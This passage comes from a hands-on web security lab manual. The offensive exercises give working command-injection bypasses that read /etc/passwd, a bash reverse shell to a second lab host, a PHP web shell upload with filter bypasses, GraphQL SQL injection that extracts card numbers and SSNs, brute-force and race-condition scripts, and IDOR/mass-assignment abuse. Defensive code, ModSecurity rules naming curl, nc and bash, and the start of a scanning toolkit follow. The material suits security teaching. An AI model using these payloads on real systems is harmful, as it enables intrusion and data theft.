```bash
# ${IFS} as space substitute
curl -s "http://10.8.1.10:3000/api/ping?host=127.0.0.1;cat\${IFS}/etc/passwd" | jq .

# Brace expansion
curl -s "http://10.8.1.10:3000/api/ping?host=127.0.0.1;{cat,/etc/passwd}" | jq .

# Variable concatenation (evade keyword filters)
curl -s "http://10.8.1.10:3000/api/ping?host=127.0.0.1;a=wh;b=oami;\$a\$b" | jq .

# Wildcard path bypass
curl -s "http://10.8.1.10:3000/api/ping?host=127.0.0.1;/???/??t+/???/p??s??" | jq .
# /bin/cat /etc/passwd

# Base64 encoding bypass
curl -s "http://10.8.1.10:3000/api/ping?host=127.0.0.1;echo+aWQ=|base64+-d|bash" | jq .
```

**Step 5 — Reverse shell:**

```bash
# On VM2: start listener
nc -lvnp 4445

# Inject reverse shell
curl -s "http://10.8.1.10:3000/api/ping?host=127.0.0.1;bash+-i+>%26+/dev/tcp/10.8.1.20/4445+0>%261"
```

**Step 6 — Argument injection on convert endpoint:**

```bash
# The /api/convert endpoint passes filename directly to ImageMagick
# Inject arguments to read files
curl -s -X POST "http://10.8.1.10:3000/api/convert" \
  -H "Content-Type: application/json" \
  -d '{"filename":"test.jpg;id;","format":"png"}' | jq .
```

**Verification:**
- All injection operators (`;`, `|`, `&&`, `$()`, newline) achieve code execution
- Blind injection confirmed via timing and OOB callbacks
- Filter bypass with `${IFS}`, wildcards, and variable concatenation works
- Reverse shell establishes interactive access

---

### Exercise 8: GraphQL Exploitation, File Upload Attacks, and Race Conditions

**Objective:** Chain GraphQL introspection + SQL injection, deploy web shells via file upload bypass, and exploit race conditions for coupon double-spend.

**Step 1 — GraphQL introspection and schema dump:**

```bash
# Full schema introspection
curl -s -X POST "http://10.8.1.10:3001/" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,type{name,kind,ofType{name}}}}}}}"}' | jq '.data.__schema.types[] | select(.fields != null)'

# Fingerprint GraphQL engine
cd /opt/graphw00f
python3 main.py -t http://10.8.1.10:3001/ 2>/dev/null || echo "Apollo Server detected"

# Discover the secrets query
curl -s -X POST "http://10.8.1.10:3001/" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ secrets { id key_name key_value } }"}' | jq .
# Expected: API keys, database passwords, AWS keys — no auth required
```

**Step 2 — SQL injection through GraphQL:**

```bash
# SQLi via the users(role:) argument
curl -s -X POST "http://10.8.1.10:3001/" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users(role: \"admin'\\'' UNION SELECT 1,username,password,email,true,credit_card,ssn FROM users--\") { username email credit_card ssn } }"}' | jq .

# SQLi via search term
curl -s -X POST "http://10.8.1.10:3001/" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ search(term: \"'\'' UNION SELECT 1,key_name,key_value,NULL,false,NULL,NULL FROM secrets--\") { username email } }"}' | jq .
```

**Step 3 — Alias-based brute force:**

```bash
# Brute force login with aliases — single HTTP request, multiple attempts
python3 <<'PYGQL_BRUTE'
import requests

passwords = ["admin", "password", "123456", "admin123", "root", "S3cur3P@ss!"]
aliases = []
for i, pwd in enumerate(passwords):
    aliases.append(f'a{i}: login(username: "admin", password: "{pwd}") {{ token }}')

query = "mutation { " + " ".join(aliases) + " }"
resp = requests.post("http://10.8.1.10:3001/",
    json={"query": query})
print(resp.json())
PYGQL_BRUTE
```

**Step 4 — File upload bypass and web shell deployment:**

```bash
# Direct PHP upload (blocked by extension filter)
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -s -X POST "http://10.8.1.10:3000/api/upload" \
  -F "file=@/tmp/shell.php" | jq .
# Expected: "Extension blocked" (if extension check exists)

# Bypass: alternative extensions
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.phtml
curl -s -X POST "http://10.8.1.10:3000/api/upload" \
  -F "file=@/tmp/shell.phtml" | jq .

# Bypass: double extension
cp /tmp/shell.phtml /tmp/shell.php.jpg
curl -s -X POST "http://10.8.1.10:3000/api/upload" \
  -F "file=@/tmp/shell.php.jpg" | jq .

# Bypass: path traversal in filename
curl -s -X POST "http://10.8.1.10:3000/api/upload" \
  -F "file=@/tmp/shell.phtml;filename=../../../tmp/uploads/shell.phtml" | jq .

# SVG with JavaScript (XSS via upload)
cat > /tmp/xss.svg <<'SVGXSS'
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <circle cx="50" cy="50" r="40"/>
</svg>
SVGXSS
curl -s -X POST "http://10.8.1.10:3000/api/upload" \
  -F "file=@/tmp/xss.svg" | jq .
# If served with Content-Type: image/svg+xml → XSS
```

**Step 5 — Race condition: coupon double-spend:**

```bash
# Send 20 concurrent requests to apply the same single-use coupon
python3 <<'PYRACE'
import requests
import concurrent.futures

url = "http://10.8.1.10:3000/api/apply-coupon"
payload = {"coupon_code": "SAVE50"}

def apply_coupon(i):
    resp = requests.post(url, json=payload)
    return f"Request {i}: {resp.status_code} - {resp.json()}"

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    futures = [executor.submit(apply_coupon, i) for i in range(20)]
    results = [f.result() for f in concurrent.futures.as_completed(futures)]

successes = sum(1 for r in results if '"discount"' in r)
print(f"\nSuccessful redemptions: {successes}")
print("Expected for single-use coupon: 1")
print(f"Race condition {'EXPLOITED' if successes > 1 else 'not triggered'}")

for r in sorted(results):
    print(r)
PYRACE
```

**Step 6 — Mass assignment via API:**

```bash
# Get current user profile
TOKEN=$(curl -s -X POST "http://10.8.1.10:3000/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice_hash"}' | jq -r .token)

# Attempt privilege escalation via mass assignment
curl -s -X PUT "http://10.8.1.10:3000/api/v1/users/2" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role":"admin","is_admin":true}' | jq .
# Expected: role and is_admin updated — no field-level authorization

# BOLA/IDOR: access other users' profiles
for i in $(seq 1 5); do
  echo "--- User $i ---"
  curl -s "http://10.8.1.10:3000/api/v1/users/$i/profile" \
    -H "Authorization: Bearer $TOKEN" | jq '.credit_card, .ssn'
done
```

**Verification:**
- GraphQL introspection reveals full schema including secrets
- SQL injection through GraphQL extracts data from arbitrary tables
- File upload bypass deploys files with alternative extensions
- Race condition results in multiple redemptions of single-use coupon
- Mass assignment escalates user role to admin
- BOLA allows accessing other users' PII (credit cards, SSNs)

---

## PART B: DEFENSIVE — Protection Systems

### Exercise 9: Parameterized Queries and Input Validation Framework

**Objective:** Build a comprehensive input validation and query safety layer for the Express application, defending against all SQL injection variants, NoSQL injection, and command injection.

**Step 1 — Implement parameterized queries:**

```javascript
// secure_queries.js — Safe database access layer

const { Pool } = require('pg');
const Joi = require('joi');

const pool = new Pool({
    host: 'localhost',
    port: 5432,
    database: 'vulndb',
    user: 'webapp',
    password: 'webapp_pass',
    max: 20,
    statement_timeout: 5000,
});

// ═══════════════════════════════════════════════════
// SAFE search — parameterized query
// ═══════════════════════════════════════════════════
async function safeSearch(query) {
    // Validate input
    const schema = Joi.string().max(100).pattern(/^[a-zA-Z0-9\s\-_.@]+$/).required();
    const { error, value } = schema.validate(query);
    if (error) throw new Error(`Invalid search query: ${error.message}`);

    const result = await pool.query(
        'SELECT id, username, email FROM users WHERE username ILIKE $1',
        [`%${value}%`]
    );
    return result.rows;
}

// ═══════════════════════════════════════════════════
// SAFE user lookup — parameterized with integer validation
// ═══════════════════════════════════════════════════
async function safeGetUser(id) {
    const schema = Joi.number().integer().positive().required();
    const { error, value } = schema.validate(id);
    if (error) throw new Error(`Invalid user ID: ${error.message}`);

    const result = await pool.query(
        'SELECT id, username, email, role FROM users WHERE id = $1',
        [value]
    );
    return result.rows[0] || null;
}

// ═══════════════════════════════════════════════════
// SAFE ordering — allowlist-based column selection
// ═══════════════════════════════════════════════════
const ALLOWED_SORT_COLUMNS = new Set(['id', 'username', 'email', 'role']);
const ALLOWED_SORT_DIRECTIONS = new Set(['ASC', 'DESC']);

async function safeListUsers(sortColumn = 'id', sortDir = 'ASC') {
    if (!ALLOWED_SORT_COLUMNS.has(sortColumn)) {
        throw new Error(`Invalid sort column: ${sortColumn}`);
    }
    if (!ALLOWED_SORT_DIRECTIONS.has(sortDir.toUpperCase())) {
        throw new Error(`Invalid sort direction: ${sortDir}`);
    }
    const result = await pool.query(
        `SELECT id, username, email, role FROM users ORDER BY ${sortColumn} ${sortDir}`
    );
    return result.rows;
}

// ═══════════════════════════════════════════════════
// SAFE login — parameterized with bcrypt comparison
// ═══════════════════════════════════════════════════
const bcrypt = require('bcrypt');

async function safeLogin(username, password) {
    const schema = Joi.object({
        username: Joi.string().max(100).required(),
        password: Joi.string().max(200).required()
    });
    const { error } = schema.validate({ username, password });
    if (error) throw new Error(`Invalid input: ${error.message}`);

    const result = await pool.query(
        'SELECT id, username, password, role FROM users WHERE username = $1',
        [username]
    );

    if (result.rows.length === 0) return null;

    const user = result.rows[0];
    const valid = await bcrypt.compare(password, user.password);
    if (!valid) return null;

    return { id: user.id, username: user.username, role: user.role };
}

// ═══════════════════════════════════════════════════
// SAFE password change — prevents second-order SQLi
// ═══════════════════════════════════════════════════
async function safeChangePassword(userId, newPassword) {
    const schema = Joi.object({
        userId: Joi.number().integer().positive().required(),
        newPassword: Joi.string().min(12).max(200).required()
    });
    const { error } = schema.validate({ userId, newPassword });
    if (error) throw new Error(`Invalid input: ${error.message}`);

    const hash = await bcrypt.hash(newPassword, 12);
    await pool.query(
        'UPDATE users SET password = $1 WHERE id = $2',
        [hash, userId]
    );
}

module.exports = {
    safeSearch,
    safeGetUser,
    safeListUsers,
    safeLogin,
    safeChangePassword
};
```

**Step 2 — NoSQL injection defense:**

```javascript
// mongo_sanitize.js — MongoDB input sanitization

function sanitizeMongoInput(input) {
    if (typeof input !== 'object' || input === null) return input;

    const sanitized = {};
    for (const [key, value] of Object.entries(input)) {
        // Block all MongoDB operators
        if (key.startsWith('$')) continue;
        sanitized[key] = typeof value === 'object' && value !== null
            ? sanitizeMongoInput(value)
            : value;
    }
    return sanitized;
}

// Safe MongoDB login
async function safeMongoLogin(db, username, password) {
    // Type enforcement — both must be strings
    if (typeof username !== 'string' || typeof password !== 'string') {
        throw new Error('Username and password must be strings');
    }

    // Length limits
    if (username.length > 100 || password.length > 200) {
        throw new Error('Input too long');
    }

    const user = await db.collection('users').findOne({
        username: username,
        password: password
    });

    return user ? { username: user.username, role: user.role } : null;
}

module.exports = { sanitizeMongoInput, safeMongoLogin };
```

**Step 3 — Command injection defense:**

```javascript
// safe_commands.js — Shell-free system command execution

const { execFile } = require('child_process');
const dns = require('dns');
const net = require('net');

// SAFE: ping using execFile (no shell invocation)
function safePing(host) {
    return new Promise((resolve, reject) => {
        // Strict allowlist: hostname or IP only
        const valid = /^[a-zA-Z0-9.\-]+$/.test(host);
        if (!valid || host.length > 253) {
            return reject(new Error('Invalid hostname'));
        }

        // Verify it's a valid IP or resolvable hostname
        if (net.isIP(host) || /^[a-zA-Z0-9.\-]+$/.test(host)) {
            execFile('ping', ['-c', '2', '-W', '3', host],
                { timeout: 10000 },
                (err, stdout, stderr) => {
                    if (err && err.killed) return reject(new Error('Timeout'));
                    resolve(stdout || stderr);
                }
            );
        } else {
            reject(new Error('Invalid host'));
        }
    });
}

// SAFE: DNS lookup using library function (no shell at all)
function safeDnsLookup(domain) {
    return new Promise((resolve, reject) => {
        const valid = /^[a-zA-Z0-9.\-]+$/.test(domain);
        if (!valid || domain.length > 253) {
            return reject(new Error('Invalid domain'));
        }
        dns.resolve(domain, (err, addresses) => {
            if (err) return reject(err);
            resolve(addresses);
        });
    });
}

module.exports = { safePing, safeDnsLookup };
```

**Verification:**
- Parameterized queries reject all SQLi payloads (union, blind, auth bypass)
- MongoDB sanitizer strips `$ne`, `$gt`, `$regex`, and `$where` operators
- Command execution uses `execFile` (no shell) and strict hostname allowlist
- Second-order SQLi blocked by using user ID (not username) for password changes
- bcrypt comparison prevents timing attacks on login

---

### Exercise 10: SSRF, XXE, and Deserialization Defense Stack

**Objective:** Implement a defense-in-depth stack against SSRF (URL validation + DNS rebinding protection), XXE (disabled DTD processing), and deserialization (type-safe alternatives).

**Step 1 — SSRF prevention middleware:**

```python
# ssrf_defense.py — Comprehensive SSRF prevention

import ipaddress
import socket
import re
from urllib.parse import urlparse
from functools import wraps
from flask import request, jsonify

BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),    # link-local / cloud metadata
    ipaddress.ip_network('127.0.0.0/8'),        # loopback
    ipaddress.ip_network('0.0.0.0/8'),          # current network
    ipaddress.ip_network('100.64.0.0/10'),      # CGNAT
    ipaddress.ip_network('::1/128'),            # IPv6 loopback
    ipaddress.ip_network('fc00::/7'),           # IPv6 private
    ipaddress.ip_network('fe80::/10'),          # IPv6 link-local
]

ALLOWED_SCHEMES = {'http', 'https'}
MAX_REDIRECTS = 3
BLOCKED_PORTS = {22, 25, 110, 143, 445, 3306, 5432, 6379, 11211, 27017}

def validate_url(url: str, allow_redirects: bool = True) -> tuple[bool, str]:
    """Validate URL against SSRF protection rules."""
    try:
        parsed = urlparse(url)
    except Exception:
        return False, "Invalid URL format"

    # Scheme check
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False, f"Blocked scheme: {parsed.scheme}"

    # Port check
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    if port in BLOCKED_PORTS:
        return False, f"Blocked port: {port}"

    hostname = parsed.hostname
    if not hostname:
        return False, "No hostname"

    # Block numeric IP representations (hex, octal, decimal)
    if re.match(r'^0x[0-9a-fA-F]+$', hostname) or \
       re.match(r'^0[0-7]+$', hostname) or \
       re.match(r'^\d+$', hostname):
        return False, "Blocked: numeric IP encoding"

    # DNS resolution — resolve BEFORE making request (prevent DNS rebinding)
    try:
        addrs = socket.getaddrinfo(hostname, port, socket.AF_UNSPEC, socket.SOCK_STREAM)
    except socket.gaierror:
        return False, f"DNS resolution failed for {hostname}"

    for addr_info in addrs:
        ip = ipaddress.ip_address(addr_info[4][0])
        for network in BLOCKED_NETWORKS:
            if ip in network:
                return False, f"Blocked: resolved to internal address {ip}"

    return True, "OK"

def ssrf_protected(f):
    """Decorator to protect endpoints from SSRF."""
    @wraps(f)
    def decorated(*args, **kwargs):
        url = request.args.get('url') or request.json.get('url', '') if request.is_json else ''
        if url:
            valid, reason = validate_url(url)
            if not valid:
                return jsonify({'error': f'SSRF blocked: {reason}'}), 403
        return f(*args, **kwargs)
    return decorated
```

**Step 2 — XXE prevention:**

```python
# xxe_defense.py — Safe XML parsing

import defusedxml.ElementTree as SafeET
from lxml import etree
import json

def safe_parse_xml(xml_string: str) -> dict:
    """Parse XML safely with all entity processing disabled."""
    try:
        # defusedxml blocks: DTDs, external entities, entity expansion
        root = SafeET.fromstring(xml_string)
        return element_to_dict(root)
    except SafeET.ParseError as e:
        raise ValueError(f"XML parse error: {e}")

def safe_parse_xml_lxml(xml_string: str) -> dict:
    """Parse XML with lxml (for XPath support) with entities disabled."""
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        dtd_validation=False,
        load_dtd=False,
        huge_tree=False,        # prevent billion-laughs
    )
    try:
        root = etree.fromstring(xml_string.encode(), parser)
        return element_to_dict_lxml(root)
    except etree.XMLSyntaxError as e:
        raise ValueError(f"XML parse error: {e}")

def element_to_dict(elem):
    """Convert ElementTree element to dict."""
    result = {}
    for child in elem:
        tag = child.tag.split('}')[-1] if '}' in child.tag else child.tag
        if len(child):
            result[tag] = element_to_dict(child)
        else:
            result[tag] = child.text
    return result

def element_to_dict_lxml(elem):
    """Convert lxml element to dict."""
    result = {}
    for child in elem:
        tag = etree.QName(child.tag).localname if isinstance(child.tag, str) else str(child.tag)
        if len(child):
            result[tag] = element_to_dict_lxml(child)
        else:
            result[tag] = child.text
    return result
```

**Step 3 — Deserialization defense:**

```python
# deser_defense.py — Safe deserialization alternatives

import json
from pydantic import BaseModel, field_validator
from typing import Optional

# NEVER use pickle for untrusted data — use JSON + schema validation

class SessionData(BaseModel):
    """Type-safe session data model — replaces pickle deserialization."""
    user_id: int
    username: str
    role: str
    expires_at: str
    preferences: Optional[dict] = None

    @field_validator('role')
    @classmethod
    def validate_role(cls, v):
        allowed = {'user', 'admin', 'manager'}
        if v not in allowed:
            raise ValueError(f'Invalid role: {v}')
        return v

    @field_validator('username')
    @classmethod
    def validate_username(cls, v):
        if len(v) > 100 or not v.isalnum():
            raise ValueError('Invalid username')
        return v

def safe_load_session(data: str) -> SessionData:
    """Safely load session data from JSON string."""
    try:
        parsed = json.loads(data)
    except json.JSONDecodeError as e:
        raise ValueError(f"Invalid JSON: {e}")

    return SessionData(**parsed)

# For YAML: use yaml.safe_load (not yaml.load)
import yaml

def safe_load_yaml(data: str) -> dict:
    """Safely load YAML without code execution."""
    return yaml.safe_load(data)
```

**Step 4 — File upload defense:**

```python
# upload_defense.py — Secure file upload handler

import os
import uuid
import magic
import subprocess
from PIL import Image
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf', 'csv', 'txt'}
ALLOWED_MIMETYPES = {
    'image/png', 'image/jpeg', 'image/gif',
    'application/pdf', 'text/csv', 'text/plain'
}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
UPLOAD_DIR = '/var/uploads'  # Outside web root

def validate_and_save_upload(file_storage) -> str:
    """Validate, sanitize, and save uploaded file securely."""

    # 1. Extension check (allowlist)
    original_name = secure_filename(file_storage.filename)
    ext = original_name.rsplit('.', 1)[-1].lower() if '.' in original_name else ''
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError(f"Extension '{ext}' not allowed")

    # 2. Size check
    file_storage.seek(0, 2)  # seek to end
    size = file_storage.tell()
    file_storage.seek(0)
    if size > MAX_FILE_SIZE:
        raise ValueError(f"File too large: {size} bytes (max {MAX_FILE_SIZE})")

    # 3. Magic bytes check (actual content, not Content-Type header)
    header = file_storage.read(8192)
    file_storage.seek(0)
    detected_mime = magic.from_buffer(header, mime=True)
    if detected_mime not in ALLOWED_MIMETYPES:
        raise ValueError(f"Content type '{detected_mime}' not allowed")

    # 4. Generate random filename (prevents path traversal, extension manipulation)
    safe_name = f"{uuid.uuid4()}.{ext}"
    dest_path = os.path.join(UPLOAD_DIR, safe_name)

    # 5. For images: re-encode to strip embedded code
    if detected_mime.startswith('image/'):
        img = Image.open(file_storage)
        img.save(dest_path)
    else:
        file_storage.save(dest_path)

    # 6. Virus scan (optional but recommended)
    try:
        result = subprocess.run(
            ['clamscan', '--no-summary', dest_path],
            capture_output=True, text=True, timeout=30
        )
        if result.returncode != 0:
            os.remove(dest_path)
            raise ValueError("Malware detected in uploaded file")
    except FileNotFoundError:
        pass  # ClamAV not installed — skip scan

    return safe_name
```

**Verification:**
- SSRF defense blocks all internal IP ranges, numeric encodings, and dangerous ports
- URL validation resolves DNS before making requests (prevents DNS rebinding)
- XXE defense with `defusedxml` blocks all DTD processing and entity expansion
- Pydantic models replace pickle with type-safe JSON deserialization
- File upload defense: allowlist extensions, magic byte check, image re-encoding, random filenames

---

### Exercise 11: Detection Engineering — Sigma Rules, WAF Tuning, and YARA Deployment

**Objective:** Deploy and validate detection rules for all server-side attack categories, tune ModSecurity CRS for reduced false positives, and build an automated alert pipeline.

**Step 1 — Sigma rule validation pipeline:**

```bash
#!/bin/bash
# sigma_validation.sh — Test all Sigma rules against attack traffic

SIGMA_DIR="/opt/sigma-rules"
LOG_FILE="/var/log/nginx/access.log"
RESULTS="/tmp/sigma_results.json"

echo '{"results": []}' > "$RESULTS"

# Simulate attack traffic and verify detection
attacks=(
    "SQLi:http://10.8.1.30/express/api/search?q=' UNION SELECT 1,2,3--"
    "NoSQLi:http://10.8.1.30/express/api/search?q=test&password[\$ne]=x"
    "SSTI:http://10.8.1.30/flask/greet?name={{7*7}}"
    "CMDi:http://10.8.1.30/express/api/ping?host=127.0.0.1;id"
    "SSRF:http://10.8.1.30/express/api/fetch?url=http://169.254.169.254/"
    "XXE:POST http://10.8.1.30/express/api/xml-import"
)

echo "=== Sigma Rule Validation ==="
for attack in "${attacks[@]}"; do
    type="${attack%%:*}"
    url="${attack#*:}"

    echo -n "Testing $type detection... "

    if [[ "$url" == POST* ]]; then
        curl -s -o /dev/null -X POST "${url#POST }" \
            -H "Content-Type: application/xml" \
            -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><d>&xxe;</d>'
    else
        curl -s -o /dev/null "$url"
    fi

    sleep 1

    # Check ModSecurity audit log for detection
    if grep -q "$type\|$(echo "$url" | sed 's/[^a-zA-Z0-9]/.*/g')" /var/log/modsecurity/modsec_audit.log 2>/dev/null; then
        echo "DETECTED ✓"
    else
        echo "check manually"
    fi
done
```

**Step 2 — ModSecurity CRS tuning:**

```bash
# custom_crs_rules.conf — Custom rules and tuning

cat > /etc/nginx/modsecurity/custom-rules.conf <<'CUSTOM_MODSEC'
# ─── Custom rule: SSTI detection (not covered by default CRS) ───
SecRule REQUEST_URI|ARGS "@rx \{\{.*\}\}" \
    "id:100001,\
     phase:1,\
     deny,\
     status:403,\
     log,\
     msg:'SSTI Jinja2/Twig probe detected',\
     severity:CRITICAL,\
     tag:'attack/ssti'"

# ─── Custom rule: NoSQL operator injection ───
SecRule ARGS "@rx \$(?:ne|gt|lt|regex|where|exists|or|and|not|in|nin)" \
    "id:100002,\
     phase:2,\
     deny,\
     status:403,\
     log,\
     msg:'NoSQL operator injection detected',\
     severity:CRITICAL,\
     tag:'attack/nosqli'"

# ─── Custom rule: Pickle deserialization payload ───
SecRule REQUEST_BODY "@rx (?:cos\n|csubprocess|__reduce__|posix\nsystem)" \
    "id:100003,\
     phase:2,\
     deny,\
     status:403,\
     log,\
     msg:'Python pickle deserialization payload detected',\
     severity:CRITICAL,\
     tag:'attack/deserialization'"

# ─── Custom rule: SSRF to metadata endpoints ───
SecRule ARGS "@rx 169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200" \
    "id:100004,\
     phase:1,\
     deny,\
     status:403,\
     log,\
     msg:'SSRF attempt to cloud metadata endpoint',\
     severity:CRITICAL,\
     tag:'attack/ssrf'"

# ─── Custom rule: Command injection metacharacters ───
SecRule ARGS "@rx (?:;|\||\$\(|`|&&)\s*(?:id|whoami|cat|ls|wget|curl|nc|bash|sh|python)" \
    "id:100005,\
     phase:1,\
     deny,\
     status:403,\
     log,\
     msg:'OS command injection attempt detected',\
     severity:CRITICAL,\
     tag:'attack/cmdi'"

# ─── Custom rule: Java serialization magic bytes ───
SecRule REQUEST_BODY "@rx ^rO0AB" \
    "id:100006,\
     phase:2,\
     deny,\
     status:403,\
     log,\
     msg:'Java deserialization payload detected (Base64 magic bytes)',\
     severity:CRITICAL,\
     tag:'attack/deserialization'"

# ─── Tuning: reduce false positives ───
# Exclude API endpoints that legitimately use SQL-like syntax
SecRule REQUEST_URI "@beginsWith /api/analytics" \
    "id:100100,\
     phase:1,\
     pass,\
     nolog,\
     ctl:ruleRemoveById=942100-942999"

# Exclude file upload endpoints from body inspection size limits
SecRule REQUEST_URI "@beginsWith /api/upload" \
    "id:100101,\
     phase:1,\
     pass,\
     nolog,\
     ctl:requestBodyLimit=52428800"
CUSTOM_MODSEC

echo "Include /etc/nginx/modsecurity/custom-rules.conf" >> /etc/nginx/modsecurity/modsecurity.conf
nginx -t && systemctl reload nginx
```

**Step 3 — Automated alert pipeline:**

```python
#!/usr/bin/env python3
# alert_pipeline.py — Parse ModSecurity logs and generate structured alerts

import json
import re
import sys
from datetime import datetime
from pathlib import Path

SEVERITY_MAP = {
    'CRITICAL': 4,
    'ERROR': 3,
    'WARNING': 2,
    'NOTICE': 1,
}

ATTACK_CATEGORIES = {
    '942': 'SQL Injection',
    '941': 'XSS',
    '100001': 'SSTI',
    '100002': 'NoSQL Injection',
    '100003': 'Deserialization',
    '100004': 'SSRF',
    '100005': 'Command Injection',
    '100006': 'Java Deserialization',
    '933': 'PHP Injection',
    '932': 'Remote Command Execution',
    '931': 'Local File Inclusion',
    '930': 'Remote File Inclusion',
    '921': 'HTTP Protocol Attack',
    '920': 'Protocol Violation',
}

def parse_modsec_audit(log_path: str):
    """Parse ModSecurity audit log and extract alerts."""
    alerts = []
    current_entry = {}

    with open(log_path) as f:
        for line in f:
            line = line.strip()

            # Match rule trigger lines
            rule_match = re.search(
                r'id "(\d+)".*msg "([^"]*)".*severity "([^"]*)"', line
            )
            if rule_match:
                rule_id = rule_match.group(1)
                msg = rule_match.group(2)
                severity = rule_match.group(3)

                # Determine attack category
                category = 'Unknown'
                for prefix, cat_name in ATTACK_CATEGORIES.items():
                    if rule_id.startswith(prefix):
                        category = cat_name
                        break

                alerts.append({
                    'timestamp': datetime.utcnow().isoformat(),
                    'rule_id': rule_id,
                    'message': msg,
                    'severity': severity,
                    'severity_score': SEVERITY_MAP.get(severity, 0),
                    'category': category,
                    'source_ip': current_entry.get('client_ip', 'unknown'),
                    'uri': current_entry.get('uri', 'unknown'),
                })

            # Extract metadata
            ip_match = re.search(r'client (\d+\.\d+\.\d+\.\d+)', line)
            if ip_match:
                current_entry['client_ip'] = ip_match.group(1)

            uri_match = re.search(r'uri "(.*?)"', line)
            if uri_match:
                current_entry['uri'] = uri_match.group(1)

    return alerts

def generate_report(alerts):
    """Generate summary report from alerts."""
    report = {
        'total_alerts': len(alerts),
        'by_category': {},
        'by_severity': {},
        'top_source_ips': {},
        'critical_alerts': [],
    }

    for alert in alerts:
        cat = alert['category']
        sev = alert['severity']
        ip = alert['source_ip']

        report['by_category'][cat] = report['by_category'].get(cat, 0) + 1
        report['by_severity'][sev] = report['by_severity'].get(sev, 0) + 1
        report['top_source_ips'][ip] = report['top_source_ips'].get(ip, 0) + 1

        if alert['severity_score'] >= 4:
            report['critical_alerts'].append(alert)

    return report

if __name__ == '__main__':
    log_path = sys.argv[1] if len(sys.argv) > 1 else '/var/log/modsecurity/modsec_audit.log'
    alerts = parse_modsec_audit(log_path)
    report = generate_report(alerts)
    print(json.dumps(report, indent=2))
```

**Verification:**
- Sigma rules detect SQLi, NoSQL injection, SSTI, SSRF, CMDi, XXE, deserialization
- Custom ModSecurity rules catch SSTI, NoSQL operators, pickle payloads, metadata SSRF
- CRS tuning reduces false positives on legitimate API endpoints
- Alert pipeline generates structured JSON reports with severity classification

---

## PART C: FRAMEWORK DEVELOPMENT

### Full-Stack Server-Side Security Assessment Toolkit

Build `server_attack_toolkit.py` — an 8-module Python toolkit for automated server-side vulnerability assessment.

```python
#!/usr/bin/env python3
"""
Server-Side Security Assessment Toolkit
========================================
Comprehensive toolkit for authorized security testing of server-side
web application vulnerabilities.

Modules:
    1. SQLiScanner      — SQL injection detection and exploitation
    2. NoSQLiScanner    — NoSQL operator injection testing
    3. SSTIDetector     — Template engine detection and SSTI probing
    4. SSRFTester       — SSRF endpoint testing with metadata checks
    5. CMDiTester       — Command injection with blind detection
    6. XXETester        — XXE entity injection testing
    7. DeserTester      — Deserialization vulnerability testing
    8. APIAuditor       — BOLA/IDOR, mass assignment, rate limiting

Usage:
    python3 server_attack_toolkit.py --target http://target.com --modules all
    python3 server_attack_toolkit.py --target http://target.com --modules sqli,ssrf,cmdi
"""

import argparse
import json
import time
import re
import sys
import base64
import hashlib
import pickle
import os
import concurrent.futures
from dataclasses import dataclass, field, asdict
from typing import Optional
from urllib.parse import urlparse, quote

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


# ═══════════════════════════════════════════════════════════
# CORE INFRASTRUCTURE
# ═══════════════════════════════════════════════════════════

@dataclass
class Finding:
    """Represents a single security finding."""
    module: str
    severity: str          # CRITICAL, HIGH, MEDIUM, LOW, INFO
    title: str
    description: str
    endpoint: str
    payload: str = ""
    evidence: str = ""
    cwe: str = ""
    cvss: float = 0.0
    remediation: str = ""
    owasp_api: str = ""

@dataclass
class ScanResult:
    """Aggregated scan results."""
    target: str
    scan_time: str
    modules_run: list = field(default_factory=list)
    findings: list = field(default_factory=list)
    summary: dict = field(default_factory=dict)

    def add_finding(self, finding: Finding):
        self.findings.append(finding)

    def generate_summary(self):
        self.summary = {
            'total_findings': len(self.findings),
            'critical': sum(1 for f in self.findings if f.severity == 'CRITICAL'),
            'high': sum(1 for f in self.findings if f.severity == 'HIGH'),
            'medium': sum(1 for f in self.findings if f.severity == 'MEDIUM'),
            'low': sum(1 for f in self.findings if f.severity == 'LOW'),
            'info': sum(1 for f in self.findings if f.severity == 'INFO'),
            'by_module': {},
        }
        for f in self.findings:
            self.summary['by_module'].setdefault(f.module, []).append(f.title)

class HTTPClient:
    """Resilient HTTP client with retry logic and timeout."""

    def __init__(self, timeout=10, max_retries=2, user_agent=None):
        self.session = requests.Session()
        self.timeout = timeout
        retry = Retry(total=max_retries, backoff_factor=0.5,
                      status_forcelist=[502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        if user_agent:
            self.session.headers['User-Agent'] = user_agent

    def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.get(url, **kwargs)

    def post(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.post(url, **kwargs)

    def put(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.put(url, **kwargs)


# ═══════════════════════════════════════════════════════════
# MODULE 1: SQL INJECTION SCANNER
# ═══════════════════════════════════════════════════════════

class SQLiScanner:
    """Detects SQL injection across multiple variants."""

    ERROR_SIGNATURES = {
        'postgresql': [r'ERROR:\s+syntax error', r'unterminated quoted string',
                       r'pg_query', r'PG::SyntaxError'],
